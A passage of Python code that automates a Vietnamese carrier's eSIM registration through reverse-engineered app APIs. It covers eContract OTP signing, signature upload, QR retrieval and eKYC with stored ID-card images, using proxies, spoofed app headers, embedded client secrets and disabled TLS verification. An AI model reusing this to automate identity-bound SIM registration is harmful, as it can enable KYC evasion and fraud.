        with open(str(session_path), 'r', encoding='utf-8') as session_handle:
            session_data = json.load(session_handle)
    except Exception as exc:
        raise EsimRegistrationError(f'cannot read My VNPT session: {exc}') from exc

    session_id = str(session_data.get('session') or session_data.get('API_SESSION_ID') or '')
    device_info = str(session_data.get('DEVICE_INFO') or session_data.get('Device-Info') or DEVICE_INFO)
    if not session_id:
        raise EsimRegistrationError('My VNPT session is missing session/API_SESSION_ID')

    proxy_dict = None
    try:
        proxy_dict = proxy_manager.current_requests_proxies(refresh_if_missing=True)
    except Exception:
        proxy_dict = None
    http = requests.Session()
    http.trust_env = False
    http.mount('https://', DhAdapter())
    if proxy_dict:
        http.proxies.update(proxy_dict)

    # This is the same TelecomExchangeSsoRequest used by
    # Uiv3EsimMigrateStep3ViewModel: {token, client_id, client_secret}.
    exchange_headers = {
        'Content-Type': 'application/json; charset=UTF-8',
        'Accept': 'application/json',
        'Device-Info': device_info,
        'User-Agent': 'okhttp/4.7.2',
    }
    try:
        exchange_response = http.post(
            f'{ECONTRACT_BASE}/sso/exchange-sso-token',
            headers=exchange_headers,
            json={
                'token': session_id,
                'client_id': ECONTRACT_CLIENT_ID,
                'client_secret': ECONTRACT_CLIENT_SECRET,
            }, timeout=90, verify=False)
    except Exception as exc:
        raise EsimRegistrationError(f'eContract SSO exchange failed: {exc}') from exc
    try:
        exchange_data = exchange_response.json()
    except Exception:
        exchange_data = {}
    access_token = _esim_deep_find(exchange_data, 'access_token', 'accessToken')
    if exchange_response.status_code < 200 or exchange_response.status_code >= 300 or not access_token:
        message = _esim_deep_find(exchange_data, 'message', 'msg', 'error_description') or exchange_response.text[:300]
        raise EsimRegistrationError(f'eContract SSO exchange: HTTP {exchange_response.status_code} - {message}')

    econtract_headers = {
        'Content-Type': 'application/json; charset=UTF-8',
        'Accept': 'application/json',
        'Authorization': f'Bearer {access_token}',
        'Token-Id': str(cfg.get('econtract_token_id') or ECONTRACT_TOKEN_ID),
        'Token-Key': str(cfg.get('econtract_token_key') or ECONTRACT_TOKEN_KEY),
        'DeviceId': str(cfg.get('econtract_device_id') or session_data.get('DEVICE_ID') or uuid.uuid4()),
        'LogId': str(cfg.get('econtract_log_id') or ''),
        'Connection': 'close',
        'User-Agent': 'okhttp/4.7.2',
    }
    ma_nv = (cfg.get('hrm_code') or cfg.get('ma_hrm') or cfg.get('maNv') or
             _esim_deep_find(detail_result, 'hrmCreator', 'maHrm', 'maNv') or '')
    return {
        'cfg': cfg,
        'result': result,
        'result_file': result_file,
        'contract_id': str(contract_id),
        'ma_nv': str(ma_nv),
        'http': http,
        'headers': econtract_headers,
    }


def _esim_contract_error(response):
    try:
        payload = response.json()
    except Exception:
        payload = {}
    message = _esim_deep_find(payload, 'message', 'msg', 'error_description', 'error')
    if not message:
        message = response.text[:300]
    return str(message or 'unknown eContract error')


def _esim_contract_stage_and_forms(result):
    """Return the lifecycle stage and supported sign forms from a result.

    eContract responses use both ``currentStage`` and the Vietnamese
    ``trangThai`` field depending on the endpoint.  Normalising them here
    prevents the eSIM flow from sending a customer contract to the employee
    ``/commit`` transition.
    """
    detail_result = _esim_deep_find(result.get('contract_detail'), 'result') or {}
    contract_result = result.get('contract_result') or {}
    stage = (result.get('current_stage') or result.get('currentStage') or
             detail_result.get('currentStage') or detail_result.get('trangThai') or
             contract_result.get('currentStage') or contract_result.get('trangThai') or '')
    forms = (result.get('sign_forms') or detail_result.get('signForm') or
             detail_result.get('sign_forms') or [])
    if isinstance(forms, str):
        forms = [forms]
    return str(stage or '').upper(), [str(item).upper() for item in forms if item]


def run_esim_contract_send_otp(config, session_file=None, log_cb=print):
    """Start (or resend) the eContract OTP for a created eSIM contract."""
    context = _esim_contract_context(config, session_file=session_file, log_cb=log_cb)
    result = context['result']
    contract_id = context['contract_id']
    stage, sign_forms = _esim_contract_stage_and_forms(result)

    # My VNPT creates the customer-ready draft in LC_DRAFT_SUBMIT.  The
    # Android eContract SDK starts customer signing with electronic-sign and
    # receives an idSign that is required for OTP verification.
    customer_sign_flow = stage == 'LC_DRAFT_SUBMIT' or (
        str(result.get('customer_ready_sign', '')).upper() == 'Y' and
        'OTP' in sign_forms
    )
    if customer_sign_flow:
        endpoint = f'{ECONTRACT_BASE}/management-service/contracts/{contract_id}/electronic-sign'
        params = {'signForm': 'OTP'}
        body = None
        log_cb('[ESIM] LC_DRAFT_SUBMIT: tao electronic-sign signForm=OTP...')
    elif result.get('otp_sent') and result.get('otp_flow') == 'commit':
        endpoint = f'{ECONTRACT_BASE}/management-service/contracts/{contract_id}/resend-commit-otp'
        params = None
        body = None
        log_cb('[ESIM] Gui lai OTP commit...')
    elif stage in ('LC_DRAFT', 'LC_DRAFT_COMMIT'):
        endpoint = f'{ECONTRACT_BASE}/management-service/contracts/{contract_id}/commit'
        params = None
        body = {'maNv': context['ma_nv']}
        log_cb('[ESIM] LC_DRAFT: gui OTP commit...')
    else:
        raise EsimRegistrationError(
            f'eContract lifecycle {stage or "(unknown)"} khong cho phep /commit; '
            'can dung electronic-sign cho hop dong khach hang')
    try:
        request_kwargs = {
            'headers': context['headers'], 'timeout': 90, 'verify': False,
        }
        if body is not None:
            request_kwargs['json'] = body
        if params is not None:
            request_kwargs['params'] = params
        response = context['http'].post(endpoint, **request_kwargs)
    except Exception as exc:
        raise EsimRegistrationError(f'eContract OTP request failed: {exc}') from exc
    if response.status_code < 200 or response.status_code >= 300:
        raw = response.text[:600]
        log_cb(f'[ESIM] eContract OTP raw error: {raw}')
        raise EsimRegistrationError(f'eContract OTP request: HTTP {response.status_code} - {_esim_contract_error(response)} | raw={raw}')
    if customer_sign_flow:
        try:
            payload = response.json()
        except Exception:
            payload = {}
        sign_id = _esim_deep_find(payload, 'idSign', 'id_sign')
        if not sign_id:
            raise EsimRegistrationError('eContract electronic-sign khong tra ve idSign')
        result['econtract_sign_id'] = str(sign_id)
        result['otp_flow'] = 'electronic-sign'
        result['otp_sign_form'] = 'OTP'
    else:
        result['otp_flow'] = 'commit'
    result['otp_sent'] = True
    result['otp_sent_at'] = __import__('datetime').datetime.now().isoformat(timespec='seconds')
    result['status'] = 'esim_contract_otp_pending'
    # Deliberately do not store access_token, OTP, or the full eContract response.
    _esim_save_result(result, context['result_file'])
    log_cb('[ESIM] OTP da gui. Hay nhap ma 6 so de xac nhan.')
    return result


def run_esim_contract_verify_otp(config, otp, session_file=None, log_cb=print):
    """Verify OTP; handwritten signImg1 is submitted by the next step."""
    otp_value = str(otp or '').strip()
    if not re.fullmatch(r'\d{6}', otp_value):
        raise EsimRegistrationError('eContract OTP phai gom dung 6 chu so')
    context = _esim_contract_context(config, session_file=session_file, log_cb=log_cb)
    result = context['result']
    contract_id = context['contract_id']
    sign_id = result.get('econtract_sign_id')
    if sign_id or result.get('otp_flow') == 'electronic-sign':
        if not sign_id:
            raise EsimRegistrationError('thieu idSign de xac nhan OTP eContract')
        endpoint = f'{ECONTRACT_BASE}/esignature-service/esign/{sign_id}/verify'
        # APK TokenOtp(String otp) sets documentHash to an empty string.  The
        # My VNPT challengeCode belongs to eKYC, not to this eSignature
        # verification payload; sending it here makes the server reject a
        # valid OTP as OTP_INVALID.
        body = {'otp': otp_value, 'documentHash': ''}
        log_cb('[ESIM] Xac nhan OTP electronic-sign eSIM...')
    elif result.get('otp_flow') == 'commit':
        endpoint = f'{ECONTRACT_BASE}/management-service/contracts/{contract_id}/verify-commit-otp'
        body = None
        log_cb('[ESIM] Xac nhan OTP commit eSIM...')
    else:
        raise EsimRegistrationError('chua co electronic-sign idSign; khong goi verify-commit-otp')
    try:
        request_kwargs = {'headers': context['headers'], 'timeout': 90, 'verify': False}
        if body is not None:
            request_kwargs['json'] = body
        else:
            request_kwargs['params'] = {'otp': otp_value}
        response = context['http'].post(endpoint, **request_kwargs)
    except Exception as exc:
        raise EsimRegistrationError(f'eContract OTP verify failed: {exc}') from exc
    if response.status_code < 200 or response.status_code >= 300:
        raise EsimRegistrationError(f'eContract OTP verify: HTTP {response.status_code} - {_esim_contract_error(response)}')
    result['ok'] = True
    # ``/verify`` only validates the OTP.  The APK follows it with
    # ``/esign/{idSign}/v2/sign`` and uploads the handwritten signImg1 before
    # the contract becomes fully signed and eSIM provisioning can start.
    result['status'] = 'esim_contract_otp_verified_pending_signature'
    result['customer_signed'] = 'N'
    result['otp_verified'] = True
    result['otp_verified_at'] = __import__('datetime').datetime.now().isoformat(timespec='seconds')
    result['signature_submitted'] = False
    _esim_save_result(result, context['result_file'])
    log_cb('[ESIM] OTP hop le; con buoc upload chu ky signImg1 qua /v2/sign.')
    return result


def run_esim_contract_submit_signature(config, signature_file,
                                      session_file=None, log_cb=print):
    """Submit the handwritten signature image required after OTP verify."""
    signature_path = os.path.abspath(str(signature_file or ''))
    if not os.path.isfile(signature_path) or os.path.getsize(signature_path) <= 128:
        raise EsimRegistrationError(f'signature image not found/empty: {signature_path}')
    context = _esim_contract_context(config, session_file=session_file, log_cb=log_cb)
    result = context['result']
    sign_id = str(result.get('econtract_sign_id') or '')
    if not sign_id:
        raise EsimRegistrationError('thieu idSign de upload chu ky')
    endpoint = f'{ECONTRACT_BASE}/esignature-service/esign/{sign_id}/v2/sign'
    # These are the exact OTP-sign fields used by the My VNPT eContract SDK.
    # eKYC fields are intentionally empty here: eKYC was completed by the
    # ACTIVE_SIM flow, while signImg1 is the user's handwritten signature.
    form_data = {
        'documentHash': str(context['cfg'].get('document_hash') or ''),
        'pointEkyc': '',
        'ekyc': '',
        'idCard': '',
        'name': '',
        'birthDay': '',
        'birthPlace': '',
        'recentLocation': '',
        'issueDate': '',
        'issuePlace': '',
        'gender': '',
        'validDate': '',
        'isOwner': str(context['cfg'].get('is_owner') or '0'),
    }
    multipart_headers = {key: value for key, value in context['headers'].items()
                        if key.lower() != 'content-type'}
    # eContract requires the signature image to be registered on the contract
    # before the idSign endpoint accepts it.  Without this call /v2/sign
    # returns HTTP 404 "Chưa đăng ký hình ảnh chữ ký điện tử".
    detail_result = _esim_deep_find(result.get('contract_detail'), 'result') or {}
    register_data = {
        'SignForm': 'OTP',
        'ekycInfo': '',
        'email': str(result.get('email') or ''),
        'identifierCode': str(detail_result.get('soGiayTo') or ''),
        'name': str(detail_result.get('tenKhachHang') or ''),
        'pathImg': '',
        'phone': str(detail_result.get('sdtKhachHang') or result.get('msisdn') or ''),
        'provider': 'VNPT',
        'signDate': __import__('datetime').datetime.now().isoformat(timespec='seconds'),
        'signPosition': [],
        'signType': 'SIGN_IMAGE',
        'status': '1',
        'taxCode': str(detail_result.get('maSoThue') or ''),
        'totalPages': '',
    }
    log_cb('[ESIM] POST management-service/contracts/{contractId}/digital-sign (register sign image)')
    try:
        with open(signature_path, 'rb') as signature_handle:
            register_response = context['http'].post(
                f'{ECONTRACT_BASE}/management-service/contracts/{context["contract_id"]}/digital-sign',
                headers=multipart_headers,
                files={
                    'data': (None, json.dumps(register_data, ensure_ascii=False), 'application/json'),
                    'file': (os.path.basename(signature_path), signature_handle, 'image/png'),
                }, timeout=120, verify=False)
    except Exception as exc:
        raise EsimRegistrationError(f'eContract signature image registration failed: {exc}') from exc
    try:
        register_payload = register_response.json()
    except Exception:
        register_payload = {}
    if register_response.status_code < 200 or register_response.status_code >= 300:
        raise EsimRegistrationError(
            f'eContract signature image registration: HTTP {register_response.status_code} - '
            f'{_esim_contract_error(register_response)}')
    register_code = _esim_error_code(register_payload)
    if register_code not in ('', '0', '00', '200', 'success', 'true'):
        register_message = _esim_deep_find(register_payload, 'message', 'msg') or register_response.text[:300]
        raise EsimRegistrationError(
            f'eContract signature image registration: {register_code} - {register_message}')

    log_cb('[ESIM] POST /esignature-service/esign/{idSign}/v2/sign (signImg1)')
    try:
        with open(signature_path, 'rb') as signature_handle:
            response = context['http'].post(
                endpoint, headers=multipart_headers, data=form_data,
                files={'signImg1': (os.path.basename(signature_path), signature_handle,
                                    'image/png')}, timeout=120, verify=False)
    except Exception as exc:
        raise EsimRegistrationError(f'eContract signature submit failed: {exc}') from exc
    try:
        payload = response.json()
    except Exception:
        payload = {}
    if response.status_code < 200 or response.status_code >= 300:
        raise EsimRegistrationError(
            f'eContract signature submit: HTTP {response.status_code} - {_esim_contract_error(response)}')
    code = _esim_error_code(payload)
    if code not in ('', '0', '00', '200', 'success', 'true'):
        message = _esim_deep_find(payload, 'message', 'msg') or response.text[:300]
        raise EsimRegistrationError(f'eContract signature submit: {code} - {message}')
    result['signature_submitted'] = True
    result['signature_file'] = os.path.basename(signature_path)
    result['status'] = 'esim_contract_signed'
    result['customer_signed'] = 'Y'
    result['signature_registration_response'] = register_payload
    result['signature_response'] = payload
    _esim_save_result(result, context['result_file'])
    log_cb('[ESIM] Upload chu ky signImg1 thanh cong; hop dong da ky day du.')
    return result


def run_esim_postsign_qr(config, session_file=None, log_cb=print,
                         retries=6, wait_seconds=10):
    """Wait for eSIM provisioning, resolve ``serial_sim``, then fetch QR.

    Signing the eContract only changes the contract state.  VNPT provisions
    the replacement eSIM asynchronously and exposes the serial through the
    My VNPT status endpoint.  The QR endpoint requires that serial; a
    contractId/requestOrderId must never be sent in its place.
    """
    cfg = _esim_load_config(config)
    result_file = _esim_contract_result_path(cfg)
    if not os.path.exists(result_file):
        raise EsimRegistrationError(f'contract result file not found: {result_file}')
    with open(result_file, 'r', encoding='utf-8') as result_handle:
        result = json.load(result_handle)
    if not isinstance(result, dict):
        raise EsimRegistrationError('contract result must be a JSON object')

    target_msisdn = _esim_normalize_msisdn(
        result.get('msisdn') or cfg.get('target_msisdn') or cfg.get('msisdn'))
    if not target_msisdn:
        raise EsimRegistrationError('msisdn is missing from eSIM result')
    session_path = session_file or cfg.get('session_file') or DEVICE_SESSION_JSON
    if not os.path.exists(session_path):
        raise EsimRegistrationError(f'session file not found: {session_path}')
    with open(session_path, 'r', encoding='utf-8') as session_handle:
        session_data = json.load(session_handle)
    session_id = (session_data.get('login_session') or
                  session_data.get('API_SESSION_ID') or '')
    bearer = session_data.get('BEARER_TOKEN') or session_data.get('Authorization') or ''
    if bearer and not str(bearer).lower().startswith('bearer '):
        bearer = 'Bearer ' + str(bearer)
    device_info = session_data.get('DEVICE_INFO') or session_data.get('Device-Info') or DEVICE_INFO
    mac_address = session_data.get('MAC_ADDRESS') or session_data.get('mac-address') or MAC_ADDRESS
    if not session_id or not bearer:
        raise EsimRegistrationError('My VNPT session is missing session/bearer')

    proxy_dict = None
    try:
        proxy_dict = proxy_manager.current_requests_proxies(refresh_if_missing=True)
    except Exception:
        proxy_dict = None
    http = requests.Session()
    http.trust_env = False
    http.mount('https://', DhAdapter())
    if proxy_dict:
        http.proxies.update(proxy_dict)
    headers = {
        'Content-Type': 'application/json; charset=UTF-8',
        'Accept': 'application/json',
        'Cache-Control': 'no-cache',
        'Channel-Code': 'APP',
        'Device-Info': device_info,
        'Language': 'vi_VN',
        'Authorization': bearer,
        'partnerCode': 'MYVNPT',
        'User-Agent': 'okhttp/4.7.2',
        'mac-address': mac_address,
    }

    def post_plain(endpoint, body):
        log_cb(f'[ESIM QR] POST {endpoint}')
        try:
            response = http.post(MYVNPT_BASE + endpoint, headers=headers,
                                 json=body, timeout=90, verify=False)
        except Exception as exc:
            raise EsimRegistrationError(f'{endpoint}: {exc}') from exc
        try:
            payload = response.json()
        except Exception:
            payload = {}
        if response.status_code != 200:
            message = _esim_deep_find(payload, 'message', 'msg') or response.text[:300]
            raise EsimRegistrationError(f'{endpoint}: HTTP {response.status_code} - {message}')
        return payload

    def find_value(payload, *keys):
        if isinstance(payload, dict):
            for key in keys:
                value = payload.get(key)
                if value not in (None, '', [], {}):
                    return value
            for value in payload.values():
                found = find_value(value, *keys)
                if found not in (None, '', [], {}):
                    return found
        elif isinstance(payload, list):
            for value in payload:
                found = find_value(value, *keys)
                if found not in (None, '', [], {}):
                    return found
        return ''

    serial_sim = str(
        cfg.get('serial_sim') or cfg.get('serialSim') or
        result.get('serial_sim') or result.get('serialSim') or '')
    status_payload = {}
    for attempt in range(max(1, int(retries))):
        if not serial_sim:
            # This is a read-only provisioning/status lookup.  It is safe to
            # retry while the signed contract is still being processed.
            status_payload = post_plain('/mapi_v2/services/myvnpt_esim_watch_status', {
                'msisdn': target_msisdn,
                'session': session_id,
            })
            serial_sim = str(find_value(
                status_payload, 'serial_sim', 'serialSim', 'simSerial', 'serial',
                'iccid', 'ICCID') or '')
            if serial_sim:
                break
            log_cb(f'[ESIM QR] Chua co serial_sim (lan {attempt + 1}/{max(1, int(retries))}).')
            if attempt + 1 < max(1, int(retries)):
                import time as _time
                _time.sleep(max(0, int(wait_seconds)))

    if not serial_sim:
        result['qr_status'] = 'waiting_serial_sim'
        result['qr_last_status_response'] = status_payload
        _esim_save_result(result, result_file)
        log_cb('[ESIM QR] Hop dong da ky nhung VNPT chua cap serial_sim; chua the lay QR.')
        return result

    log_cb(f'[ESIM QR] Da nhan serial_sim={serial_sim}; dang lay QR...')
    qr_payload = post_plain('/mapi_v2/services/myvnpt_dktttb_esim_get_qr', {
        'channel': 'APP',
        'serial_sim': serial_sim,
    })
    qr_string = str(find_value(qr_payload, 'qrString', 'qr_string', 'qrCode', 'qr_code', 'qr') or '')
    if not qr_string:
        result['serial_sim'] = serial_sim
        result['qr_status'] = 'serial_ready_qr_pending'
        result['qr_response'] = qr_payload
        _esim_save_result(result, result_file)
        log_cb('[ESIM QR] Co serial_sim nhung API chua tra QR; thu lai sau.')
        return result

    result['serial_sim'] = serial_sim
    result['qr'] = qr_string
    result['qr_status'] = 'ready'
    _esim_save_result(result, result_file)
    log_cb('[ESIM QR] QR eSIM da san sang va da luu vao result file.')
    return result


def run_esim_registration(config, session_file=None, log_cb=print, otp_provider=input):
    """Run the My VNPT SIMSO -> active_sim -> QR eSIM flow.

    The existing DKTTTB flow remains separate. This function is deliberately
    config-driven because selecting a number, package, address and signing an
    e-contract are user decisions, not safe defaults.
    """
    cfg = _esim_load_config(config)
    # The phone screen labelled eSIM migration/change only asks for backup
    # phone + email.  Keep that flow separate from the optional SIMSO
    # purchase/order flow below.
    if str(cfg.get('mode', '')).lower() in ('change', 'migration', 'migrate', 'change_esim'):
        if cfg.get('continue_ekyc') or cfg.get('ekyc_artifacts_file') or cfg.get('ekyc_result_file') or cfg.get('ekyc_artifacts'):
            return run_esim_change_ekyc(cfg, session_file=session_file, log_cb=log_cb)
        return run_esim_change_request(cfg, session_file=session_file, log_cb=log_cb)
    session_path = session_file or DEVICE_SESSION_JSON
    if not os.path.exists(session_path):
        raise EsimRegistrationError(f'session file not found: {session_path}')
    with open(session_path, 'r', encoding='utf-8') as session_handle:
        session_data = json.load(session_handle)

    master_key = session_data.get('KEY_ENCRYPT_AES') or AES_MASTER_KEY
    try:
        private_key = _esim_decrypt_with_master(session_data.get('rsa_key_private', ''), master_key)
        server_public_key = _esim_decrypt_with_master(session_data.get('server_public_key', ''), master_key)
    except Exception as exc:
        raise EsimRegistrationError(f'cannot decrypt device session: {exc}') from exc
    if not private_key or not server_public_key:
        raise EsimRegistrationError('device_session.json lacks rsa_key_private/server_public_key')

    session_id = session_data.get('login_session') or session_data.get('API_SESSION_ID') or cfg.get('session', '')
    bearer = session_data.get('BEARER_TOKEN') or session_data.get('Authorization') or cfg.get('authorization', '')
    if bearer and not bearer.lower().startswith('bearer '):
        bearer = 'Bearer ' + bearer
    device_info = session_data.get('DEVICE_INFO') or session_data.get('Device-Info') or DEVICE_INFO
    mac_address = session_data.get('MAC_ADDRESS') or session_data.get('mac-address') or MAC_ADDRESS
    if not session_id or not bearer or not device_info:
        raise EsimRegistrationError('session, bearer and device info are required')

    proxy_dict = None
    try:
        proxy_dict = proxy_manager.current_requests_proxies(refresh_if_missing=True)
    except Exception:
        proxy_dict = None
    http = requests.Session()
    http.trust_env = False
    http.mount('https://', DhAdapter())
    if proxy_dict:
        http.proxies.update(proxy_dict)

    def base_headers():
        return {
            'Content-Type': 'application/json; charset=UTF-8',
            'Accept': 'application/json',
            'Cache-Control': 'no-cache',
            'Channel-Code': 'APP',
            'Device-Info': device_info,
            'Language': 'vi_VN',
            'Authorization': bearer,
            'partnerCode': 'MYVNPT',
            'User-Agent': 'okhttp/4.7.2',
            'mac-address': mac_address,
        }

    def post_plain(endpoint, body, required=True):
        url = MYVNPT_BASE + endpoint
        log_cb(f'[ESIM] POST {endpoint}')
        try:
            response = http.post(url, headers=base_headers(), json=body,
                                 timeout=90, verify=False)
        except Exception as exc:
            if required:
                raise EsimRegistrationError(f'{endpoint}: {exc}') from exc
            log_cb(f'[ESIM] optional request failed: {exc}')
            return {}
        try:
            data = response.json()
        except Exception:
            data = {'raw': response.text[:1000]}
        if response.status_code != 200:
            message = _esim_deep_find(data, 'message', 'msg') or response.text[:300]
            if required:
                raise EsimRegistrationError(f'{endpoint}: HTTP {response.status_code} - {message}')
            log_cb(f'[ESIM] optional HTTP {response.status_code}: {message}')
            return data
        if not _esim_is_success(data):
            message = _esim_deep_find(data, 'message', 'msg') or 'server rejected request'
            if required:
                raise EsimRegistrationError(f'{endpoint}: {_esim_error_code(data)} - {message}')
            log_cb(f'[ESIM] optional rejected: {message}')
        return data

    def post_v2(endpoint, body):
        aes_key = ''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(32))
        request_data = aes_encrypt(json.dumps(body, separators=(',', ':'), ensure_ascii=False), aes_key)
        headers = base_headers()
        headers['X-Secret-Key'] = rsa_encrypt_no_padding(aes_key, server_public_key)
        headers['X-Signature'] = sign_sha256_rsa(request_data, private_key)
        url = MYVNPT_BASE + endpoint
        log_cb(f'[ESIM] POST {endpoint} (encrypted v2)')
        try:
            response = http.post(url, headers=headers, json={'requestData': request_data},
                                 timeout=120, verify=False)
        except Exception as exc:
            raise EsimRegistrationError(f'{endpoint}: {exc}') from exc
        try:
            outer = response.json()
        except Exception:
            raise EsimRegistrationError(f'{endpoint}: invalid JSON response')
        if response.status_code != 200:
            message = _esim_deep_find(outer, 'message', 'msg') or response.text[:300]
            raise EsimRegistrationError(f'{endpoint}: HTTP {response.status_code} - {message}')
        encrypted_response = outer.get('data') if isinstance(outer, dict) else None
        if isinstance(encrypted_response, str) and encrypted_response:
            try:
                plain = aes_decrypt_gen(encrypted_response, aes_key)
                inner = json.loads(plain)
            except Exception:
                inner = outer
        else:
            inner = outer
        if not _esim_is_success(inner) and not _esim_is_success(outer):
            message = _esim_deep_find(inner, 'message', 'msg') or _esim_deep_find(outer, 'message', 'msg')
            raise EsimRegistrationError(f'{endpoint}: {_esim_error_code(inner) or _esim_error_code(outer)} - {message}')
        return inner

    order = cfg.get('order') if isinstance(cfg.get('order'), dict) else {}
    login_msisdn = _esim_normalize_msisdn(cfg.get('login_msisdn') or session_data.get('phone_number_login'))
    target_msisdn = _esim_normalize_msisdn(order.get('msisdn') or cfg.get('target_msisdn') or login_msisdn)
    buy_msisdn = _esim_normalize_msisdn(order.get('buy_msisdn') or cfg.get('buy_msisdn'))
    token = str(order.get('token') or cfg.get('token') or '')
    order_id = str(order.get('order_id') or cfg.get('order_id') or '')
    if not target_msisdn:
        raise EsimRegistrationError('target_msisdn is required')

    context = {'target_msisdn': target_msisdn, 'buy_msisdn': buy_msisdn,
               'session': session_id, 'order_id': order_id}

    # SIMSO selection/order stage. Supplying order_id skips this stage for a
    # previously-created order and is useful when resuming after e-contract.
    if not order_id:
        post_plain('/package_service/simso_order/getEsimMode', {
            'msisdn': target_msisdn,
            'requestId': str(uuid.uuid4()),
            'token': token,
        }, required=False)
        package_id = str(order.get('package_id') or cfg.get('package_id') or '')
        package_type = order.get('package_type', cfg.get('package_type', ''))
        packages = post_plain('/package_service/simso_order/getPackages', {
            'msisdn': target_msisdn, 'package_type': package_type, 'token': token,
        }, required=False)
        if not package_id:
            package_id = str(_esim_deep_find(packages, 'package_id', 'packageId', 'id') or '')
        if not package_id:
            raise EsimRegistrationError('package_id is required (getPackages was only discovery)')
        if not buy_msisdn:
            raise EsimRegistrationError('buy_msisdn is required (the selected number)')

        filter_body = {
            'commit': order.get('commit', cfg.get('commit', '')),
            'msisdn': target_msisdn,
            'numberType': order.get('numberType', cfg.get('numberType', '')),
            'numberTypeId': order.get('numberTypeId', cfg.get('numberTypeId', '')),
            'pageNumber': order.get('pageNumber', cfg.get('pageNumber', 1)),
            'pageRecord': order.get('pageRecord', cfg.get('pageRecord', 20)),
            'prefix': order.get('prefix', cfg.get('prefix', '')),
            'search': order.get('search', cfg.get('search', '')),
            'token': token,
        }
        if any(value not in ('', None) for key, value in filter_body.items() if key not in ('msisdn', 'token')):
            post_plain('/package_service/simso_order/filter', filter_body, required=False)

        booking_body = {
            'apiVersion': order.get('apiVersion', '2'),
            'authen': order.get('authen', cfg.get('authen', '')),
            'buy_msisdn': buy_msisdn,
            'channel': order.get('channel', cfg.get('channel', 'APP')),
            'commitment': order.get('commitment', cfg.get('commitment', '')),
            'monthly': order.get('monthly', cfg.get('monthly', '')),
            'msisdn': target_msisdn,
            'sim_valid_key': order.get('sim_valid_key', cfg.get('sim_valid_key', '')),
            'stock': order.get('stock', cfg.get('stock', '')),
            'token': token,
        }
        booking = post_plain('/package_service/simso_order/bookingSim', booking_body)
        token = str(_esim_deep_find(booking, 'token', 'accessToken') or token)
        booking_trans_id = _esim_deep_find(booking, 'trans_id', 'transId', 'transactionId')
        if booking_trans_id:
            context['booking_trans_id'] = booking_trans_id

        post_plain('/package_service/simso_order/getConfig', {
            'msisdn': target_msisdn, 'session': session_id, 'token': token,
        }, required=False)
        authen_otp = str(order.get('authen_otp') or cfg.get('authen_otp') or '')
        if authen_otp or order.get('authen_request') or cfg.get('authen_request'):
            authen_body = order.get('authen_request') or cfg.get('authen_request') or {
                'apiVersion': '2', 'msisdn': target_msisdn,
                'otp': authen_otp, 'session': session_id,
            }
            authen = post_plain('/package_service/simso_order/authen', authen_body)
            token = str(_esim_deep_find(authen, 'token', 'accessToken') or token)

        order_keys = (
            'address', 'apiVersion', 'booksim_trans_id', 'buy_msisdn', 'delivery_id',
            'district', 'district_id', 'email', 'full_name', 'msisdn', 'msisdn_type',
            'note', 'otp', 'package_id', 'payment_type', 'pgd_id', 'province',
            'province_id', 'received_type', 'sim_type', 'street', 'street_id',
            'street_type', 'token', 'ward', 'ward_id',
        )
        order_body = dict(order.get('order_payload') or cfg.get('order_payload') or {})
        for key in order_keys:
            if key in order and key not in order_body:
                order_body[key] = order[key]
            elif key in cfg and key not in order_body:
                order_body[key] = cfg[key]
        order_body.update({
            'apiVersion': order_body.get('apiVersion') or '2',
            'msisdn': order_body.get('msisdn') or target_msisdn,
            'buy_msisdn': order_body.get('buy_msisdn') or buy_msisdn,
            'package_id': order_body.get('package_id') or package_id,
            'payment_type': order_body.get('payment_type', 216),
            'token': order_body.get('token') or token,
            'otp': '',
        })
        first_order = post_plain('/package_service/simso_order/orderSim', order_body, required=False)
        context['initial_order'] = first_order

        contact_phone = _esim_normalize_msisdn(cfg.get('contact_phone') or order_body.get('msisdn') or target_msisdn)
        otp_request = {
            'msisdn': contact_phone,
            'otpService': cfg.get('otp_service', order.get('otp_service', '')),
            'service': 'otp_send',
        }
        post_plain('/mapi_v2/services/otp_send', otp_request)
        order_otp = str(cfg.get('order_otp') or order.get('order_otp') or '')
        if not order_otp:
            if cfg.get('non_interactive'):
                raise EsimRegistrationError('order_otp is required after otp_send')
            order_otp = str(otp_provider('Nhap OTP tao don eSIM: ')).strip()
        order_body['otp'] = order_otp
        final_order = post_plain('/package_service/simso_order/orderSim', order_body)
        context['final_order'] = final_order
        order_id = str(_esim_deep_find(final_order, 'orderId', 'order_id', 'orderID', 'id') or '')
        if not order_id:
            order_id = str(_esim_deep_find(first_order, 'orderId', 'order_id', 'orderID', 'id') or '')
        if not order_id:
            raise EsimRegistrationError('orderSim did not return order_id')
        context['order_id'] = order_id
        details = post_plain('/package_service/simso_order/orderDetail', {
            'msisdn': target_msisdn, 'orderId': order_id, 'token': token,
        }, required=False)
        context['order_detail'] = details
    else:
        log_cb(f'[ESIM] Resume existing order_id={order_id}')

    # eKYC/contract stage. The face result itself is not interchangeable with
    # DKTTTB: ACTIVE_SIM requires OCR data/signature and a new challenge.
    artifacts = cfg.get('ekyc_artifacts') if isinstance(cfg.get('ekyc_artifacts'), dict) else {}
    artifact_file = cfg.get('ekyc_result_file')
    if artifact_file and os.path.exists(str(artifact_file)):
        with open(str(artifact_file), 'r', encoding='utf-8') as artifact_handle:
            loaded_artifacts = json.load(artifact_handle)
        if isinstance(loaded_artifacts, dict):
            artifacts = {**loaded_artifacts, **artifacts}

    cccd_front = cfg.get('cccd_front') or cfg.get('cccd_front_path') or _cccd_file_paths('0' + target_msisdn[2:])[0]
    cccd_back = cfg.get('cccd_back') or cfg.get('cccd_back_path') or _cccd_file_paths('0' + target_msisdn[2:])[1]
    portrait = _find_esim_portrait(
        target_msisdn, cfg.get('portrait') or cfg.get('portrait_path'))
    if os.path.isfile(str(cccd_front)) and os.path.isfile(str(cccd_back)):
        import hashlib as _hashlib
        try:
            with open(str(cccd_front), 'rb') as _front_file:
                _front_hash = _hashlib.sha256(_front_file.read()).digest()
            with open(str(cccd_back), 'rb') as _back_file:
                _back_hash = _hashlib.sha256(_back_file.read()).digest()
            if _front_hash == _back_hash:
                raise EsimRegistrationError(
                    'CCCD front/back are byte-identical; refusing to upload the same image twice')
        except OSError as exc:
            raise EsimRegistrationError(f'cannot read CCCD images: {exc}') from exc
    required_files = [path for path in (cccd_front, cccd_back, portrait) if not os.path.isfile(str(path))]
    if required_files:
        raise EsimRegistrationError('missing image input: ' + ', '.join(required_files))

    ocr_data = cfg.get('ocr_data') or cfg.get('dataEKYC') or artifacts.get('ocrData') or artifacts.get('dataEKYC') or ''
